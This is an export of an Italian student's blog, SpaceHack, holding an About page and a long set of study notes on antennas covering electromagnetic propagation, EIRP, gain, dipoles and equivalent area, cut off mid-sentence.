[{"categories":null,"contents":"Mi chiamo Lombardi Angelo Nunzio, in arte, k0Br@3390 e questo è SpaceHack, il mio blog. Su di esso troverai contenuti di informatica, programmazione e cyber security. Questo spazio serve a me come valvola di sfogo nel parlare a chi è davvero interessato a questo mondo e a coloro che sono interessati davvero a questo mondo come il sottoscritto. Detto questo, happy coding e sopratutto, happy hacking 👽.\n[ Github ]\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/about/","tags":null,"title":"About"},{"categories":["Tutorial"],"contents":"Table of Contents  Appunti sulle Antenne Propagazione delle onde elettromagnetiche nello spazio libero  Intensitá del campo elettromagnetico prodotto da un’antenna isotropica  Cos’é la densitá di potenza Cos’é intesitá del campo elettrico   EIRP e calcolo del campo elettromagnetico prodotto da un’antenna non isotropica  Calcolo dell’EIRP Calcolo del campo elettromagnetico prodotto da un’antenna reale     Le Antenne  Teorema di Reciprocitá Componenti di un sistema di antenna   Diagramma di radiazione e solido di radiazione Guadagno di un’antenna  Guadagno rispetto all’antenna isotropica Guadagno rispetto all’antenna al dipolo in λ/2   Principali tipi di antenne  Principio di funzionamento delle antenne lineari Banda di un’antenna lineare Resistenza d’antenna  Resistenza di radiazione Resistenza di dissipazione   Parametri tipi di delle antenne riceventi  Altezza efficace Fattore di traduzione da campo elettrico indicente Area equivalente Correlazione tra Dimensioni dell’antenna e l’area equivalente Fattore di trasduzione da densitá di potenza incidente     Antenne omnidirezionali  Dipolo in λ/2 Antenna Marconi Antenna Ground Plane Antenne Caricate Dipolo ripiegato (folded dipole) e antenne a banda larga   Antenne direttive  Angolo di apertura del fascio (beamwidth) o angolo di radiazione Front-to-Back Ratio (rapporto avanti/dietro) Antenna Yagi Antenna collineari e a cortina Puntamento delle antenne direttive   Antenne a superficie  Antenna parabolica Parabola offset Antenne paraboliche per la ricezione TV da satellite Parabola Cassegrain   Sistemi di antenna MIMO(Multiple In Multiple Out) Installazione dei sistemi di antenna  Orizzonte radio e massima distanza fra due antenne Perdite per diffrazione e prima zona di Fresnel   Dimensionamento di un collegamento radio  Bilancio di potenza (link budget) di un collegamento radio Calcolo del livello in ricezione   Fading delle Antenne   In questo blog non vorrei parlare delle discipline come informatica, sicurezza informatica, ma col tempo vorrei trattare anche tematiche che riguardano il mio indirizzo di studi, ossia telecomunicazioni. Col tempo verranno mostrati e trattati argomenti di telecomunicazioni ed elettronica.\nOggi parliamo delle antenne, qui di seguito sono riportati dei miei personali appunti, buona lettura.\n Propagazione delle onde elettromagnetiche nello spazio libero I parametri con cui si valuta l’entitá del campo elettromagnetico sono:\n Densitá di potenza \\(S\\) , che si misura in \\(w / m^2\\) Intensitá del campo elettrico \\(E\\), che si misura in \\(V / m\\)  In particolare, si deve garantire che sull’antenna ricevente si abbia un valore di campo elettromagnetico tale da ottenere in ingresso al ricevitore un segnale che abbia un livello di potenza pari alla sensibilitá del ricevitore.\nLa sensibilitá del ricevitore (in inglese sensitivity) é definita come il minimo livello di potenza del segnale in ingresso al ricevitore che consente di fornire in uscita un segnale di qualitá accettabile.\nI valori del campo elettromagnetico dipendono da fattori come:\n Potenza del segnale fornito in ingresso all’antenna trasmittente Tipo di antenna trasmittente Distanza fra antenna trasmittente e ricevente Ambiente in cui avviene la propagazione delle onde elettromagnetiche  Altri due concetti importanti per lo studio dell’entitá del campo elettromagnetico sono: l’antenna isotropica e lo spazio libero.\nUn’antenna isotropica ideale é un antenna che irradia uniformemente in tutte le direzioni dello spazio e non causa dissipazione, dunque: \\(P_{IRR} = P_{IN}\\).\nLo spazio libero é una regione dello spazio assimilabile al vuoto, questo spazio é un mezzo isotropo in cui le onde elettromagnetiche viaggiano in linea retta alla velocitá della luce, ossia a:\n$$ \\Large\\textsf{} c \\approx 3 * 10^8 \\space \\dfrac{m}{s} $$\nNello spazio libero l’intensitá del campo elettrico \\(E\\), l’intensitá del campo magnetico \\(H\\) e la densitá di potenza \\(S\\) possono essere considerati come tensione, corrente e potenza di un circuito elettrico.\nEcco una tabella che chiarisce le associazioni dei valori nello spazio libero e in un circuito elettrico:\n   Valori nello Spazio Libero  Valori in un Circuito Elettrico     Intensitá del campo elettrico E = Tensione V   Intesitá del campo magnetico H = Corrente I   Densitá di potenza S = Potenza P    Inoltre lo spazio libero é considerabile come un mezzo trasmissivo avente impedenza caratteristica:\n$$ \\Large\\textsf{} Z_0 = 120 \\pi \\space \\approx \\space 377Ω $$\nÉ possibile estendere le leggi fondamentali dell’elettrotecnica per determinare i legami fra \\(E\\), \\(H\\), \\(S\\). Avendo fatto in precedenza quelle associazioni tra i valori del campo elettromagnetico e grandezze elettriche possiamo definire le seguenti relazioni:\n$$ \\Large\\textsf{} E = Z_0 * H; \\space\\space S = E * H; \\space\\space Z_0 = \\dfrac{E}{H}; $$\nDa questi si possono definire i seguenti legami tra campo elettrico \\(E\\) e densitá di potenza:\n$$ \\Large\\textsf{} S = \\dfrac{E^2}{Z_0} \\implies S = \\dfrac{E^2}{120 * \\pi} [ \\space W / m^2 \\space] E = \\sqrt{S * Z_0} \\implies E = \\sqrt{S * 120 * \\pi} \\space\\space [\\space V / m \\space] $$\n Intensitá del campo elettromagnetico prodotto da un’antenna isotropica Lo studio della determinazione del campo elettromagnetico nel caso di un antenna isotropica posta nello spazio libero é di particolare importanza in quanto le formule ricavate possono essere riutilizzate per una valutazione del campo elettromagnetico in un ambiente reale.\nPensiamo dunque al caso ideale di un’antenna trasmittente isotropica posta nello spazio libero. All’antenna viene fornita in ingresso una certa potenza di segnale \\(P_{IN}\\), che viene totalmente irradiata in modo uniforme in tutte le direzioni, si ha dunque \\(P_{IN_ISO} = P_{IRR_ISO}\\).\n Cos’é la densitá di potenza Un generatore a radiofrequenza connesso a un’antenna isotropica, posta nello spazio libero, genererebbe onde elettromagnetiche i cui fronti d’onda sono costituiti da superfici sferiche, in quanto l’irradiazione é uniforme in tutte le direzioni e non si hanno né ostacoli né eterogeneitá.\nLa densitá di potenza é data dalla potenza per unitá di area:\n$$ \\Large\\textsf{} S = \\dfrac{P_{IRR_ISO}}{4\\pi * r^2} \\space\\space [\\space \\dfrac{W}{m^2} \\space] $$\ndove:\n \\(S \\space(W / m^2):\\) densitá di potenza a distanza $r$ dall’antenna isotropica ideale; \\(P_{IRR_ISO} \\space (W):\\) potenza irradiata in modo isotropico, pari alla potenza di ingresso nel caso di antenna isotropica ideale; \\(r(m):\\) distanza fra l’antenna isotropica e il punto in cui si valuta la densitá di potenza   Cos’é intesitá del campo elettrico Il valore efficace dell’intensitá del campo elettrico \\(E\\), si puó calcolare con la relazione:\n$$ \\Large\\textsf{} E = \\dfrac{1}{r} \\space \\sqrt{30 * P_{IRR_ISO_[w]}} \\space [\\space V/m\\space] $$\nEcco un’immagine del campo elettromagnetico generato da un’antenna isotropica:\n EIRP e calcolo del campo elettromagnetico prodotto da un’antenna non isotropica L’EIRP (Effective Isotropic Radiated Power) é definito come il livello di potenza, espresso in dBW o dBm fornito in ingresso a un’antenna isotropica per fornire lo stesso campo elettromagnetico prodotto dall’antenna reale:\n$$ \\Large\\textsf{} EIRP = 10 \\log_{10}(P_{IN_ISO}) = 10 \\log_{10}(P_{IRR_ISO}) $$\nIn altre parole dunque, l’EIRP descrivere la potenza totale irradiata da un\u0026rsquo;antenna in una determinata direzione, rispetto alla potenza che sarebbe irradiata se l\u0026rsquo;antenna fosse una sorgente isotropica ideale che irradia uniformemente in tutte le direzioni.\nL\u0026rsquo;EIRP tiene conto della potenza di trasmissione dell\u0026rsquo;antenna e della direzionalità del diagramma di radiazione dell\u0026rsquo;antenna stessa e tiene conto del fatto che un\u0026rsquo;antenna non irradia uniformemente in tutte le direzioni ma concentra la potenza in determinate direzioni. Infine l’EIRP viene utilizzata per rappresentare una misura della capacità dell\u0026rsquo;antenna di trasmettere segnali a lunghe distanze.\n Calcolo dell’EIRP In precedenza abbiamo visto la formula generica per il calcolo dell’EIRP, ma esiste anche un’altra circostanza nella quale va calcolato. Si consideri lo schema di un sistema di trasmissione radio reale che comprenda:\n Un trasmettitore con un segnale che ha una certa potenza \\(P_{TX} (W)\\) e un livello di potenza \\(L_{PTX} = 10\\log(P_{TX_[W]})\\) dBW. Un cavo che collega il trasmettitore all’antenna con un’attenuazione \\(A_F(dB)\\) Un’antenna trasmittente con un guadagno \\(G_{ant} (dB)\\)  L’EIRP viene calcolato utilizzando i decibel:\n$$ \\Large\\textsf{} EIRP = L_{PTX_[dBW]} \\space-\\space A_{F_[dB]} \\space+\\space G_{ant_[dB]} \\space[dBW] $$\nNoto l’EIRP é possibile calcolare la potenza equivalente che dovrebbe irradiare un’antenna isotropica per produrre lo stesso campo elettromagnetico che produce l’antenna reale:\n$$ \\Large\\textsf{} P_{IRR_ISO} = 10^{EIRP/10} \\space [W] $$\n Calcolo del campo elettromagnetico prodotto da un’antenna reale Nel caso di antenna reale i valori di densitá di potenza (\\(S\\) e di campo elettrico (\\(E\\) possono essere calcolati con il seguente procedimento:\n Si calcola l’EIRP. Si calcola la potenza equivalente irradiata isotropicamente. Si calcolano i valori di \\(S\\) ed \\(E\\) con la formula:  $$ \\Large\\textsf{} S = \\dfrac{P_{IRR_ISO}}{4\\pi * r^2} \\space[W/m^2]; \\space\\space E = \\dfrac{1}{r} * \\sqrt{30 * {P_{IRR_ISO}}}\\space[W/m]; $$\nIl calcolo del campo elettromagnetico in un sistema trasmittente via radio viene effettuato per due motivi:\n Verificare che la sua intensitá sia tale da fornite al ricevitore un segnale avente un livello di potenza sufficiente Verificare che il campo elettrico \\(E\\) misurato e la densitá di potenza \\(S\\) non debbano superare i seguenti valori:  $$ \\Large\\textsf{} E_{MAX} \\leq 6 \\space V/m, \\space\\space per \\space\\space 100kHz \\leq f \\leq 300 GHz \\newline S_{MAX} \\leq 0,1 \\space W/m^2, \\space\\space per \\space\\space 3MHz \\leq f \\leq 300 GHz $$\n Le Antenne L’antenna é l’ultimo elemento di un sistema di trasmissione via radio. Essa riceve un segnale da un trasmettitore il quale imprime su un segnale a radiofrequenza (RF) le informazioni da trasmettere via radio.\nL’uscira dell’amplificatore di potenza é un segnale in corrente avente frequenza adatta alla trasmissione via radio e potenza sufficiente a garantire una corretta ricezione.\nDunque possiamo dire che: Un’antenna é definita come un trasduttore che in trasmissione converte un segnale elettrico a radiofrequenza in onde elettromagnetiche irradiate nelle direzioni desiderate, mentre in ricezione converte in modo efficiente le onde elettromagneitche in un segnale elettrico a RF.\nPossiamo avere molti tipi di trasmissione radio:\n Radiodiffusione AM ed FM TV Ponti Radio Sistemi cellulari  e i requisiti richiesti per le antenne possono essere diversi. Per esempio la radiodiffusione l’antenna trasmittente é omnidirezionale sul piano orizzontale per poter raggiungere tutti gli utenti, mentre per un collegamento in ponte radio si richiede che l’antenna sia estremamente direttiva cosí da limitare la potenza necessaria per trasmettere.\nPer le antenne vale il principio di reciprocitá che afferma: le proprietá di un’antenna rimangono le stesse sia che essa venga usata come antenna trasmittente sia che ricevente.\n Teorema di Reciprocitá Il teorema di reciprocità nelle antenne di telecomunicazione è un principio fondamentale che riguarda la simmetria e l\u0026rsquo;omogeneità del mezzo di propagazione delle onde elettromagnetiche. In parole semplici, questo teorema afferma che le caratteristiche di trasmissione e di ricezione di un\u0026rsquo;antenna sono identiche quando viene utilizzata come trasmettitore e come ricevitore.\nIn altre parole, se un\u0026rsquo;antenna trasmette un segnale in una determinata direzione e successivamente viene utilizzata per ricevere un segnale nella stessa direzione, le sue proprietà di ricezione saranno le stesse che se fosse stata progettata specificamente per ricevere il segnale in questione. Questo significa che le antenne possono essere utilizzate per la trasmissione e la ricezione di segnali senza necessità di modifiche significative alla loro struttura o alla loro geometria.\nIl teorema di reciprocità si applica a tutte le antenne che soddisfano determinate condizioni di simmetria e linearità. In particolare, si applica alle antenne a filo, alle antenne a dipolo, alle antenne a cornetta, alle antenne a riflettore parabolico e alle antenne a schiera. In genere, tutte le antenne che presentano un\u0026rsquo;impedenza di radiazione costante e omogenea in tutte le direzioni sono compatibili con il teorema di reciprocità.\nL\u0026rsquo;importanza del teorema di reciprocità sta nella sua applicazione pratica. Ad esempio, quando si progetta un sistema di telecomunicazioni, spesso si utilizzano antenne diverse per la trasmissione e la ricezione dei segnali. Tuttavia, grazie al teorema di reciprocità, è possibile utilizzare la stessa antenna sia per trasmettere che per ricevere il segnale, semplificando notevolmente il progetto del sistema e riducendo i costi.\nInoltre, il teorema di reciprocità può essere utilizzato per calcolare l\u0026rsquo;efficienza di una antenna quando viene utilizzata come ricevitore, poiché l\u0026rsquo;efficienza di trasmissione e di ricezione sono uguali. Questo può essere utile per determinare la capacità di una antenna di ricevere un segnale in presenza di rumore o interferenze.\nIn sintesi, il teorema di reciprocità è un principio fondamentale delle antenne di telecomunicazione che permette di semplificare il progetto dei sistemi di comunicazione e di calcolare l\u0026rsquo;efficienza delle antenne quando vengono utilizzate come ricevitori.\n Componenti di un sistema di antenna Un impianto di trasmissione e/o ricezione via radio comprende un sistema di antenna, il quale puó essere costituito dai seguenti elementi:\n Antenna: é l’elemento irradiante o ricevente, puó essere montata su una torre (che prende il nome di traliccio o palo) al fine di garantire la copertura radio alla distanza massima prevista per il sistema di comunicazione via radio. Linea di trasmissione (feeder d’antenna): é utilizzata per collegare il trasmettitore (o il ricevitore) con l’antenna. Ha lo scopo di trasferire il segnale dal trasmettitore all’antenna con la minima attenuazione possibile. Dispositivo di adattamento: consente di riprisitnare l’adattamento fra linea e antenna nel caso in cui l’impedenza dell’antenna non si auguale all’impedenza caratteristica della linea. Dispositivo di separazione TX-RX (duplexer o circolatore): é utilizzato per separare i sensi di trasmissione (TX) e ricezione (RX) nel caso in cui si utilizzi la stessa antenna sia per trasmettere sia per ricevere. Dispositivi ausiliari: sono necessari nei grandi impianti per segnalare la presenza dell’antenna, per la protezione contro il ghiaccio, il vento e l’acqua, per il puntamento dell’antenna nel caso di antenne direttive.   Diagramma di radiazione e solido di radiazione Per rappresentare le direzioni preferenziali in cui irradia un’antenna si utilizza un diagramma di radiazione (radiation pattern).\nUn antenna reale, non irradia in modo uniforme in tutte le direzioni dello spazio. Questo diagramma mette bene in evidenza l’attitudine che ha una sorgente a concetrare la potenza in certe direzioni e quindi ne evidenzia il grado di direttività:\nIl diagramma di radiazione è una curva, riportata di solito su un diagramma polare con al centro l’antenna, che rappresenta come la potenza fornita in ingresso all’antenna viene distribuita nella varie direzione del piano considerato.\nIl diagramma di radiazione può riportare i valori del guadagno che l’antenna presenta nelle varie direzioni del piano considerato, espressi in decibel.\nNormalmente si tracciano i diagrammi di radiazione in due piani tra loro ortogonali denominati:\n Piano verticale o piano E: è il piano in cui giace il vettore campo elettrico E ed è anche il piano su cui giace un’antenna lineare; Piano orizzontale o piano H: è il piano in cui giace il vettore campo magnetico H ed è anche il piano che taglia ortogonalmente l’antenna;  A seconda di come è fatto il diagramma di radiazione in un determinato piano, un’antenna viene definita:\n Omnidirezionale: se il diagramma di radiazione in quel piano è all’incirca un cerchio l’antenna irradia uniformemente in tutte le direzioni; Direttiva: se il diagramma di radiazione in quel piano presenta delle direzioni prefenziali di irraggiamento Direttiva unidirezionale: se il diagramma di radiazione mostra una direzione preferenziale di irragiamento, quella anteriore data dal lobo principale del diagramma. Altre direzioni di minore irraggiamento, non desiderate, definite dai lobi secondari del diagramma di radiazione.   Guadagno di un’antenna Il guadagno di un’antenna è un parametro che mette in evidenza quanto un’antenna può concentrare la potenza in una certa direzione rispetto a un’antenna di riferimento. Il guadagno di un’antenna è direttiva tanto più alto è il suo guadagno.\nA seconda dell’impiego si possono avere due antenne di riferimento:\n Antenna isotropa: un’antenna puramente ideale, che irradia in modo uniforme in tutte le direzioni. Dipolo in \\(\\lambda /2\\): viene utilizzata come riferimento per le antenne lineari, in particolare nel settore delle antenne riceveneti TV.   Guadagno rispetto all’antenna isotropica Il guadagno di un’antenna può essere definito come il rapporto fra la potenza che è necessaria dare in ingresso a un’antenna isotropica ideale è la potenza che è necessario fornire al connettore dell’antenna in esame.\nIl guadagno rispetto all’antenna isotropica si calcola come:\n$$ \\Large\\textsf{} G = 10\\log_{10} \\space \\dfrac{P_{ISO}}{P_{IN}} \\space [dBi] $$\nIl guadagno viene espresso in \\(dBi\\) per indicare che è stato ottenuto prendendo come riferimento l’antenna isotropica ideale (i = isotropica).\nIl guadagno di un’antenna esprime l’aumento della potenza irradiata che si ottiene concentrando la potenza in certe direzioni.\nIl valore del guadagno nelle altre direzioni, denominato guadagno direttivo, può essere fornito tramite un diagramma di radiazione in cui si riporta il guadagno per i diversi angoli.\nQuando il guadagno viene espresso semplicemente in \\(dB\\) risulta sottointeso che l’antenna di riferimento è quella isotropa anche se non si mette.\nNoto il guadagno è possibile calcolare il livello con cui dovrebbe irradiare un’antenna per produrre lo stesso campo dell’antenna in considerazione:\n$$ \\Large\\textsf{} G_{[dB]} = 10\\log_{10} \\space P_{ISO} - 10\\log_{10} \\space P_{IN} = EIRP - L_{P_IN} $$\nDa cui si ottiene la seguente formula inversa:\n$$ \\Large\\textsf{} EIRP = L_{P_IN} \\space + \\space G_{dB} $$\nSe non è noto il livello di potenza in ingresso all’antenna ( \\(L_{P_IN}\\) ), è possibile calcolarlo in funzione del livello di potenza del trasmettitore ( \\(L_{P_TX}\\) ) e dell’attenuazione della linea (feeder, \\(A_F\\)) come:\n$$ \\Large\\textsf{} L_{P_IN} = L_{P_TX} - A_F $$\nLa direttivitá \\(D\\) il rapporto tra la potenza che dovrebbe irradiare un’antenna isotropica ( \\(P_{ISO}\\) ) e la potenza irradiata ( \\(P_{IRR}\\) ) dall’antenna in esame affinche il campo da loro prodotto sia lo stesso:\n$$ \\Large\\textsf{} D = 10\\log_{10} \\space \\dfrac{P_{ISO}}{P_{IRR}} \\space [dBi] $$\nIl guadagno effettivo (\\(G\\)), detto anche guadagno di potenza, é minore della direttivitá (\\(G \u0026lt; D\\)) a causa del fatto che un’antenna reale causa una piccola dissipazione di potenza, per cui la potenza irradiata é inferiore rispetto alla potenza in ingresso.\n Guadagno rispetto all’antenna al dipolo in λ/2 Il guadagno viene espresso in \\(dBd\\) quando si prende come antenna di riferimento il dipolo \\(\\lambda/2\\), il pedice $d$ sta proprio a indicare che si é presa come antenna di riferimento il dipolo in \\(\\lambda/2\\).\n Principali tipi di antenne È possibile identificare due categorie principali:\n  Antenne lineari: esse sono omnidirezionali a banda larga, direttive;\n  Antenna a dipolo: un dipolo è un\u0026rsquo;antenna costituita da due elementi conduttori che sono allineati elettricamente, ma con polarità opposta. Il dipolo è un\u0026rsquo;antenna molto comune e può essere utilizzato in molte applicazioni wireless, come le trasmissioni radio e televisive.\nIl dipolo è solitamente costituito da un filo metallico sottile che viene tagliato a una lunghezza specifica in base alla frequenza di trasmissione desiderata. Quando il dipolo viene alimentato con un segnale di frequenza corrispondente alla sua lunghezza, le correnti elettriche fluiscono attraverso i suoi elementi, creando un campo elettromagnetico che si irradia nell\u0026rsquo;ambiente circostante.\nIl dipolo è una delle antenne più semplici e convenienti da costruire, ed è spesso utilizzato come riferimento per la valutazione di altre antenne più complesse. Il dipolo può anche essere utilizzato in combinazione con altri elementi per creare antenne più direzionali o per migliorare le prestazioni in determinate direzioni.\n    Antenne a superficie: esse sono antenne direttive con alto guadagno; tra esse la più diffusa è l’antenna a parabola;\n   Principio di funzionamento delle antenne lineari Consideriamo un tronco di linea bifilare con terminazione aperta alimentato da un generatore a radiofrequenza ($RF$). Su di esso si viene ad instaurare un regime di onde stazionarie di corrente e tensione. Questa linea irradia poco per due motivi:\n I due conduttori sono vicini e per questo motivio l’irradiazione di uno di essi cancella quella dell’altro. Se si considera lo spazio come un carico esso risulta fortemente disadattato e così si ha poco trasferimento di potenza a essa.  Se però si piegano a $90\\degree$gradi le estremità della linea, le correnti avranno lo stesso verso in questo tratto e sarà quindi possibile irradiare energia nello spazio in modo efficiente. In questo modo si ottiene un antenna denominata antenna a dipolo o antenna Hertziana.\nDunque in sintesi: Se si vuole massimizzare l’irradiazione è necessario piegare i coduttori a una distanza \\(\\lambda/4\\) dall’estremità ottenendo così un’antenna lunga \\(\\lambda/2\\), denominata per questo dipolo \\(\\lambda/2\\) o dipolo a mezz’onda.\nIl dipolo \\(\\lambda/2\\) , ha un comportamento simile a quello di un tronco di linea in \\(\\lambda/4\\); l’onda stazionaria di corrente presenta un minimo alle estremità, mentre è massimo al centro.\n Banda di un’antenna lineare Un’antenna lineare, a dipolo, ha un comportamento analogo a quello di un circuito risonante.\nLa banda (\\(B\\)) di un’antenna può essere defnita come l’intervallo di frequenza entro cui il ROS si mantiene entro dei limiti. Tipicamente i valori limite di ROS sono compresi tra \\(1,5\\) e \\(2\\).\nLa banda di una antenna è in pratica l’intervallo di frequenza in cui il diagramma di radiazione dell’antenna fornisce le prestazioni richieste.\nLa banda dipende dal diametro del conduttore con il quale si realizza l’antenna.\n Resistenza d’antenna Un’antenna rappresenta per la linea (feeder) un carico che é resistivo in risonanza e viene denominato resistenza d’antenna ( \\(R_a\\) ). La resistenza d’antenna viene considerata come la somma di due resistenze:\n La resistenza di radiazione ( \\(R_r\\) ) La resistenza di dissipazione (\\( R_d\\) )  $$ \\Large\\textsf{} R_a \\space = \\space R_r \\space + \\space R_d \\space [Ω] $$\n Resistenza di radiazione La resistenza di radiazione é definita come il rapporto tra la potenza irradiata dall’antenna ( \\(P_{IRR}\\) ) e il quadrato della corrente ( \\(I_{IN}\\) ) che giunge in ingresso all’antenna (punto di alimentazione):\n$$ \\Large\\textsf{} R_r = \\dfrac{P_{IRR}}{I^2_{IN}} \\space [Ω] $$\nLa resistenza di radiazione é quella resistenza che dissipa una potenza pari a quella irradiata dall’antenna. Per un dipolo la \\(R_r\\) dipende da diversi fattori, tra i quali:\n Diametro del conduttore: la \\(R_r\\) aumenta al diminuire del diametro del coduttore Altezza dal suolo: alla quale si pone l’antenna; le onde elettromagnetiche emesse dall’antenna possono venire riflesse dalla terra ed indurre una corrente nell’antenna. A seconda della distanza percorsa varia la fase della corrente indotta e quindi varia la corrente totale. Si modifica percío anche la resistenza di radiazione   Resistenza di dissipazione La resistenza di dissipazione tiene conto della perdita di potenza che si puó avere sull’antenna. Per valutare le perdite sull’antenna si definie il rendimento ( \\(\\eta\\) ) dato dal rapporto fra la potenza irradiata ( \\(P_{IRR}\\) ) e la potenza in ingresso all’antenna ( \\(P_{IN}\\) ):\n$$ \\Large\\textsf{}\\eta = \\dfrac{P_{IRR}}{P_{IN}} = \\dfrac{R_r}{R_r + R_d} $$\n Parametri tipi di delle antenne riceventi In risonanza un’antenna ricevente puó essere considerata come un generatore avente resistenza interna \\(R_a\\), in grado di erogare una certa tensione e una certa potenza a un carico \\(R_u\\):\nSupponendo che l’antenna sia adattata e correttamente orientata, la tensione e la potenza che essa é in grado di erogare dipendono da due parametri di traduzione, ossia:\n L’altezza efficace ( \\(h\\) ) L’area equivalente ( \\(A_{eq} \\))   Altezza efficace L\u0026rsquo;altezza efficace \\(h_e\\) è un termine utilizzato in telecomunicazioni per descrivere l\u0026rsquo;altezza a cui un\u0026rsquo;antenna appare \u0026ldquo;efficace\u0026rdquo; nel trasferimento di segnali radio. In particolare, si riferisce all\u0026rsquo;altezza a cui un\u0026rsquo;antenna sembra essere vista dall\u0026rsquo;altro lato della comunicazione.\nInoltre, l\u0026rsquo;altezza efficace di un\u0026rsquo;antenna dipende da diversi fattori, tra cui l\u0026rsquo;altezza fisica dell\u0026rsquo;antenna, la frequenza del segnale trasmesso, la presenza di ostacoli o interferenze nell\u0026rsquo;ambiente circostante e la potenza di trasmissione dell\u0026rsquo;antenna.\nFattore di traduzione da campo elettrico indicente ( \\(E \\space V/m\\) ) a tensione d’uscita ( \\(RMS\\) ) a vuoto, \\(V_g \\space (V)\\):\n$$ \\Large\\textsf{}V_g = h_e * E $$\nPoiche \\(E\\) si esprime in \\(V/m\\), mentre \\(V_g\\) é in \\(V\\), \\(h_e\\) si esprime in mentri. Per le antenna a dipolo l’altezza efficace si puó calcolare come:\n$$ \\Large\\textsf{}h_e = \\lambda\\sqrt{\\dfrac{R_r * G}{\\pi * Z_0}} \\space [m] $$\nDove:\n \\(R_r\\): resistenza di radiazione; \\(G\\): guadagno dell’antenna non in db; \\(Z_0 = 120 \\pi\\): impedenza caratteristica dello spazio libero; \\(\\lambda\\): lunghezza d’onda dell’onda elettromagnetica indicente;   Fattore di traduzione da campo elettrico indicente Il fattore di traduzione da campo elettrico, noto anche come coefficiente di accoppiamento o fattore di accoppiamento, è un parametro che indica la quantità di energia elettromagnetica trasmessa da un\u0026rsquo;antenna trasmittente ad un\u0026rsquo;antenna ricevente.\nIn particolare, il fattore di traduzione da campo elettrico misura la frazione del campo elettrico irradiato dalla prima antenna che viene ricevuta efficacemente dalla seconda antenna, tenendo conto delle caratteristiche geometriche e di orientamento delle due antenne, della distanza tra di esse e delle proprietà del mezzo di propagazione.\nIn pratica, il fattore di traduzione da campo elettrico è un parametro importante per la progettazione e l\u0026rsquo;ottimizzazione delle antenne, poiché consente di valutare l\u0026rsquo;efficacia di un\u0026rsquo;antenna trasmittente nel trasferire energia ad un\u0026rsquo;altra antenna ricevente.\n Area equivalente L\u0026rsquo;area equivalente \\(A_{eq}\\) è una misura dell\u0026rsquo;efficienza dell\u0026rsquo;antenna e rappresenta l\u0026rsquo;area che l\u0026rsquo;antenna sembra occupare nell\u0026rsquo;ambiente circostante in termini di capacità di ricezione o trasmissione del segnale radio.\nFattore di trasduzione da densitá di potenza incidente (\\(S\\)) a potenza fornita al carico adattato ( \\(P_u\\) ):\n$$ \\Large\\textsf{}P_u = S * A_q \\space [W] $$\nPoiché $S$ si esprime in \\(W/m^2\\), mentre \\(P\\) é in \\(W\\), dimensionalmente \\(A_{eq}\\) si esprime in \\(m^2\\).\nL’area equivalente (\\( A_{eq}\\) ) di un’antenna si calcome come:\n$$ \\Large\\textsf{}A_{eq} = G \\space\\dfrac{\\lambda^2}{4\\pi} \\space [m^2] $$\nDove:\n \\(G\\): guadagno dell’antenna non in dB; \\( \\lambda \\): lunghezza d’onda dell’onda elettromagnetica indicente   Correlazione tra Dimensioni dell’antenna e l’area equivalente La dimensione di un\u0026rsquo;antenna si riferisce alle sue caratteristiche fisiche, come la lunghezza, il diametro, l\u0026rsquo;altezza e l\u0026rsquo;area di apertura. La dimensione dell\u0026rsquo;antenna è importante perché determina le sue proprietà elettriche, come l\u0026rsquo;impedenza, la direttività, la polarizzazione e la larghezza di banda. In generale, le antenne più grandi hanno una maggiore direttività e una maggiore efficienza rispetto alle antenne più piccole, ma possono essere più costose e difficili da installare. Tuttavia, le dimensioni dell\u0026rsquo;antenna dipendono dalle specifiche esigenze di trasmissione e ricezione del sistema di telecomunicazioni in cui viene utilizzata. In telecomunicazioni, l\u0026rsquo;area equivalente di un\u0026rsquo;antenna è una misura del suo potere di ricezione o trasmissione, in relazione alla sua area fisica. Essa è definita come l\u0026rsquo;area di un\u0026rsquo;antenna ideale che ha lo stesso potere di ricezione o trasmissione dell\u0026rsquo;antenna reale.\nLa dimensione dell\u0026rsquo;antenna è strettamente correlata all\u0026rsquo;area equivalente dell\u0026rsquo;antenna. In generale, le antenne più grandi hanno un\u0026rsquo;area equivalente maggiore rispetto alle antenne più piccole. Ciò significa che le antenne più grandi possono trasmettere o ricevere segnali più potenti rispetto alle antenne più piccole, a parità di condizioni.\nTuttavia, la relazione tra la dimensione e l\u0026rsquo;area equivalente dell\u0026rsquo;antenna non è lineare. Ciò significa che raddoppiare la dimensione dell\u0026rsquo;antenna non raddoppia necessariamente la sua area equivalente. La relazione dipende dalle specifiche caratteristiche dell\u0026rsquo;antenna, come la sua geometria, la frequenza di lavoro e le proprietà del materiale di cui è fatta. Pertanto, la scelta delle dimensioni dell\u0026rsquo;antenna dipende dalle specifiche esigenze di trasmissione e ricezione del sistema di telecomunicazioni in cui viene utilizzata, e deve essere fatta in base a una progettazione attenta e un\u0026rsquo;analisi dettagliata delle caratteristiche dell\u0026rsquo;antenna.\nNel caso del dipolo l\u0026rsquo;area equivalente è legata alla lunghezza d\u0026rsquo;onda, nel caso della parabola è legata al diametro dell\u0026rsquo;antenna.\n Fattore di trasduzione da densitá di potenza incidente Il fattore di trasduzione da densità di potenza incidente, noto anche come fattore di conversione, è un parametro che indica la capacità di un\u0026rsquo;antenna ricevente di convertire la densità di potenza del campo elettromagnetico incidente in una tensione elettrica rilevabile ai suoi terminali di uscita.\nIn altre parole, il fattore di trasduzione da densità di potenza incidente rappresenta il rapporto tra la potenza elettrica generata ai terminali di uscita dell\u0026rsquo;antenna e la densità di potenza del campo elettromagnetico incidente sull\u0026rsquo;antenna stessa, espressa in watt per metro quadrato.\nIl fattore di trasduzione dipende dalle caratteristiche geometriche e di orientamento dell\u0026rsquo;antenna ricevente, dalla frequenza del segnale incidente, dalla polarizzazione del segnale elettromagnetico e dalle proprietà del mezzo di propagazione.\nIl fattore di trasduzione è un parametro importante per la valutazione delle prestazioni delle antenne riceventi, in quanto consente di stimare l\u0026rsquo;efficienza con cui l\u0026rsquo;antenna converte l\u0026rsquo;energia elettromagnetica incidente in una tensione di uscita utile per l\u0026rsquo;elaborazione del segnale ricevuto.\n Antenne omnidirezionali Sono omnidirezionali quelle antenne che irradiano in modo uniforme in un piano, che di solito é il piano \\(H\\) (orizzontale), in cui il diagramma di radiazione é un cerchio.\nIn altri piani, come per esempio nel piano \\(E\\) sono direttive.\nLe antenne omnidirezionali sono utilizzate quando il sistema di trasmissione si trova in posizione baricentrica rispetto all’area da servire, per cui nel piano \\(H\\), si ha lo stesso campo indipendentemente dalla posizione dell’antenna ricevente. É questo, il caso della trasmissone in brodcast (da un trasmettitore verso tutti i ricevitori che si trovano entro l’area di copertura) di trasmettitori radio AM/FM e TV.\nIn questo caso l’antenna fondamentale é il 